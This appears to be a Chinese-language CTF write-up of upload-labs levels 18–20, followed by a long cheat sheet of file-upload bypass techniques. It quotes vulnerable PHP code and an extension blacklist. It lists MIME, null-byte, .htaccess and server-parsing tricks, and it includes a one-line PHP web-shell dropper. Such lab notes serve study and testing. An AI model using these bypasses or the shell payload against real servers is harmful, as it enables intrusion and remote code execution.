![image-20201109162635970](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109162635970.png)

不停刷新，连接

## 0X13Pass-18

还是同样的竞争条件，`index.php`调用了`MyUpload`上传类，使用了`upload`方法，执行的顺序是先上传然后再改名，但如果快速的多线程上传那就会出现bug，绕过方法和上一关的一样，但是这关在上传之前用了白名单来检测，所以只能上传图片马，用Apache解析漏洞或者是文件包含漏洞。

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

抓包发送至intruder模块

![image-20201109164425759](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109164425759.png)

![image-20201109164440532](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109164440532.png)



## 0X14Pass-19

![image-20201109164610070](C:\Users\Heria.Chen.GAIAWORKS\AppData\Roaming\Typora\typora-user-images\image-20201109164610070.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

move_uploaded_file会忽略掉文件末尾的`/.`

或者也可以用`move_uploaded_file`函数的00截断漏洞绕过（失败）

![image-20201109170923990](C:\Users\Heria.Chen.GAIAWORKS\AppData\Roaming\Typora\typora-user-images\image-20201109170923990.png)



![image-20201109170900483](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109170900483.png)



## 0X15Pass-20

![image-20201109171123776](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109171123776.png)

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

可以发现`$file_name`经过`reset($file) . '.' . $file[count($file) - 1];`处理。

如果上传的是数组的话，会跳过`$file = explode('.', strtolower($file));`。并且后缀有白名单过滤

```
$ext = end($file);
$allow_suffix = array('jpg','png','gif');
```

而最终的文件名后缀取的是`$file[count($file) - 1]`，因此我们可以让`$file`为数组。`$file[0]`为`smi1e.php/`，也就是`reset($file)`，然后再令`$file[2]`为白名单中的jpg。此时`end($file)`等于jpg，`$file[count($file) - 1]`为空。而 `$file_name = reset($file) . '.' . $file[count($file) - 1];`，也就是`smi1e.php/.`，最终`move_uploaded_file`会忽略掉`/.`，最终上传`smi1e.php`。

![image-20201109173058876](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109173058876.png)

![image-20201109173315854](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201109173315854.png)

## 0X16文件上传绕过总结

**客户端 javascript 检测 (通常为检测文件扩展名)**
这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码，最常见的就是检测扩展名是否合法
**绕过方式**：
1 前端修改允许的类型
2 burp抓包修改
3 禁用javascript(例如火狐浏览器就有禁用JS功能)

**服务端检测绕过(MIME 类型检测)**
主要是检测Content-Type: 字段
**绕过方法：**
burp抓包修改Content-Type: 为允许的字段
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg

**服务端检测绕过(文件扩展名检测)**
黑名单检测，黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多
一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件
**绕过方法**：
1 文件名大小写绕过
用像 AsP，pHp 之类的文件名绕过黑名单检测
2 名单列表绕过
用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类
3 特殊文件名绕过
比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式
在 windows 系统里是被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会
被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。
4 htaccess 文件
配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测

5 00截断绕过上传（存在限制）
1.php .jpg 空格二进制20改为00
还有一些图片木马之类的，配合文件包含和解析漏洞

6.条件竞争

7.二次渲染绕过

普通图片马上传后下载比对，将马插到没有变化的地方

8.嵌套 双写 



上传验证的种类：
1、 客户端，javascript的验证
判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。
解决方法：使用burp抓包改包，那么我们可以将一句话1.php先修改为1.jpg，然后发送，burp抓包，在burp中再将文件名修改回来。

2、 服务器端验证：
1、 文件类型验证：content-type验证（image/gif）
解决方法：通过抓包改包将content-type字段改为image/gif
2、 文件头验证(文件头，gif89a，jeff等，这里就是用图片马，图片马要修改名字)
解决方法：传图片马，，如果是单纯的对文件头进行验证，那就传个图片马的php文件，如果结合了前端，就要在burp里修改为php文件。
3、 后缀名黑名单验证
解决方法：1、试验大小写；2、漏网之鱼（jsp:jspx，jspf ； asp：asa，cer，aspx ； php：php2 php3 php4 ； exe：exee）
4、 白名单验证（）

 

配合文件包含漏洞的使用：（他检验的是特定后缀文件的内容的）
前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。
绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?>
此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：
\#PHP

<?php Include("上传的txt文件路径");?>


(一)IIS5.x-6.x解析漏洞
使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。
目录解析(6.0)
形式：www.xxx.com/xx.asp/xx.jpg
原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。（传个图片马）
文件解析
形式：www.xxx.com/xx.asp;.jpg（文件名）
原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。
解析文件类型
IIS6.0 默认的可执行文件除了asp还包含这三种 :
/test.asa
/test.cer
/test.cdx
(二)apache解析漏洞
漏洞原理
Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。
漏洞形式
www.xxxx.xxx.com/test.php.php123
其余配置问题导致漏洞
(1)如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。
(2)如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以php 方式执行。（htaccess文件上传解析漏洞，可以将这段代码写到.htaccess中，再上传写有php一句话代码的jpg文件中）

(三)nginx解析漏洞
漏洞原理
Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当 访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：
PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了
漏洞形式
www.xxxx.com/UploadFiles/image/1.jpg/1.php
www.xxxx.com/UploadFiles/image/1.jpg%00.php
www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php
另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。
(四)IIS7.5解析漏洞
IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。
5.配合操作系统文件命令规则
(1)上传不符合windows文件命名规则的文件名
test.asp.
test.asp(空格)
test.php:1.jpg
test.php:: $DATA
会被windows系统自动去掉不符合规则符号后面的内容

 

如果遇到上传一个php文件上传后自动修改成为gif或者其他格式的后缀，则可以考虑使用双重后缀，即为1.pphphp


MIME类型验证(文件类型验证)
直接修改Content-Type：允许的MIME类型
修改文件名为可执行文件，有时候需要配合修改multipart/form-data的大小写
常见的MIME类型：
超文本标记语言文本 .html text/html 　　
xml文档 .xml text/xml
普通文本 .txt text/plain 　　
RTF文本 .rtf application/rtf 　　
PDF文档 .pdf application/pdf 　　
Microsoft Word文件 .word application/msword 　　
PNG图像 .png image/png 　　
GIF图形 .gif image/gif 　　
JPEG图形 .jpeg,.jpg image/jpeg 　　
au声音文件 .au audio/basic 　　
MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　
RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　
MPEG文件 .mpg,.mpeg video/mpeg 　　
AVI文件 .avi video/x-msvideo 　　
GZIP文件 .gz application/x-gzip 　　
TAR文件 .tar application/x-tar 　　
任意的二进制数据 application/octet-stream

 


目录路利用
解析是从前往后解析，判断是从后往前判断。
零零截断一般步骤为：
1.新建一个名为test.php%00.jpg或者test.php.jpg

2.在里面写入一句话木马

3.burp抓包改%00或者.为url编码
iis按照路径解析的是：
比如我们上传一个名为123.asp/123.jpg文件
则，123.asp/123.jpg会被直接解析成123.asp
0x02_4 文件扩展名利用
黑名单检测
• 文件大小写绕过
比如像Asp，Php之类的文件名绕过黑名单检测
• 名单列表绕过
利用黑名单里没有的名单进行攻击，比如黑名单里没有asa，cer，php3，php5之类的
• 特殊文件名绕过
修改文件名为test.asp.或者test.asp_（下划线为空格），绕过验证之后，windows会自动去掉点和空格，linux和unix下不支持
• 0x00截断绕过
• 双扩展名绕过
apache解析式从后往前，所以如果上传一个test.php.123,不认识.123的文件，所以会往前解析，直到遇到能解析的


Apache的扩展名顺序解析漏洞
命名为test.php.xxx（集成环境里php3都会按照php来解析）
IIS的asp解析漏洞
• IIS6.0
• 1.命名为test.asp;.jpg
• 2.命名为test.asp/123.jpg(test.asp是一个目录)
• 3.命名为test.asa,test.cer.test.cdx
• IIS7.5/7.0
• 在默认Fast-CGI开启状况下,上传一个名字为test.jpg，内容为
• <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
• 的文件，然后访问test.jpg/.php,在这个目录下就会生成一句话木马 shell.php
Nginx的%00解析漏洞
命名为test.jpg%00.php